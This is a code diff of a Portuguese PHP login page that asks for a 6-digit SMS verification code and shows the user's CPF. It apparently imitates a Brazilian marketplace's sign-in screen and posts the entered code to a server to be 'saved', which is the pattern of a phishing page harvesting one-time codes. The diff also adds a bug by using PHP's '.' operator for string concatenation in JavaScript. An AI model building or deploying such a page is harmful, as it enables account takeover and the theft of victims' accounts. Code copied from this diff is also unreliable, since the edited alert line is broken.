@@ -1,13 +1,18 @@
 <?php
 session_start();
-$identificador_cliente = $_SESSION['identificador_usuario'] ?? '473.302.908-07';
-$tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF';
 
+// Recupera os dados da sessão para exibição dinâmica.
+$identificador_cliente = $_SESSION['identificador_usuario'] ?? '473.302.908-07'; // Valor de exemplo
+$tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF'; // Valor de exemplo
+
+// Função para formatar o CPF
 function formatarCPF($cpf) {
     $cpfLimpio = preg_replace('/[^0-9]/', '', $cpf);
     if (strlen($cpfLimpio) != 11) { return $cpf; }
     return substr($cpfLimpio, 0, 3) . '.' . substr($cpfLimpio, 3, 3) . '.' . substr($cpfLimpio, 6, 3) . '-' . substr($cpfLimpio, 9, 2);
 }
+
+// Formata o dado apenas se o tipo for 'CPF'
 $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_cliente) : $identificador_cliente;
 ?>
 <!DOCTYPE html>
@@ -23,6 +28,8 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             --cor-texto-primaria: #333;
             --cor-texto-secundaria: #666;
             --cor-fundo: #f5f5f5;
+            --cor-card: #ffffff;
+            --cor-borda: #ddd;
         }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
         .main-header { background-color: var(--cor-amarela); height: 60px; display: flex; align-items: center; padding: 0 48px; }
@@ -33,31 +40,25 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
         .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
         .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
-        
-        /* --- AJUSTE PRINCIPAL: WRAPPER PARA ALINHAMENTO LADO A LADO --- */
-        .user-info-wrapper {
-            display: flex;
-            align-items: center; /* Alinha a caixa e o link verticalmente */
-            gap: 24px; /* Espaço entre a caixa e o link */
-        }
-        
         .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 30px; padding: 8px 16px; }
         .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .user-info-box .details span { display: block; font-size: 14px; }
         .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
         
-        /* O margin-top é removido pois o alinhamento agora é feito pelo wrapper */
-        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
+        .help-link {
+            color: var(--cor-azul);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            /* CONTROLE A DISTÂNCIA VERTICAL AQUI */
+            margin-top: 32px; 
+        }
         
-        /* O restante do CSS permanece o mesmo */
-        .form-card { /* ... estilos omitidos para brevidade ... */ }
-        .code-inputs { /* ... */ }
-        .code-inputs input { /* ... */ }
-        /* Adicionei os estilos que estavam faltando do seu código anterior */
-        .form-card { background-color: #ffffff; box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 32px 40px; width: 440px; box-sizing: border-box; }
+        .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 32px 40px; width: 440px; box-sizing: border-box; }
         .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
         .code-inputs { display: flex; gap: 8px; justify-content: flex-start; margin: 16px 0; }
-        .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid #ddd; border-radius: 6px; }
+        .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
         .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
         .resend-timer { text-align: left; font-size: 14px; color: var(--cor-texto-secundaria); margin: 16px 0 24px 0; min-height: 21px; }
         .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
@@ -75,23 +76,23 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
     <main class="main-content">
         <div class="content-wrapper">
+            
             <div class="left-column">
                 <span class="session-start-label">INÍCIO DE SESSÃO</span>
                 <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
                 <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>
 
-                <div class="user-info-wrapper">
-                    <div class="user-info-box">
-                        <div class="icon">
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                        </div>
-                        <div class="details">
-                            <span><?php echo htmlspecialchars($tipo_identificador) . ': ' . htmlspecialchars($dado_formatado); ?></span>
-                            <a href="index.php">Trocar conta</a>
-                        </div>
+                <div class="user-info-box">
+                    <div class="icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                     </div>
-                    <a href="#" class="help-link">Preciso de ajuda</a>
+                    <div class="details">
+                        <span><?php echo htmlspecialchars($tipo_identificador) . ': ' . htmlspecialchars($dado_formatado); ?></span>
+                        <a href="index.php">Trocar conta</a>
+                    </div>
                 </div>
+                
+                <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
             <div class="form-card">
@@ -114,6 +115,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             </div>
         </div>
     </main>
+
     <script>
         const smsForm = document.getElementById('sms-form');
         const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
@@ -174,7 +176,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     if (result.success) {
                         alert('Código recebido com sucesso!');
                     } else {
-                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
+                        alert('Erro: ' . (result.error || 'Não foi possível salvar o código.'));
                     }
                 } catch (error) {
                     alert('Erro de conexão com o servidor.');
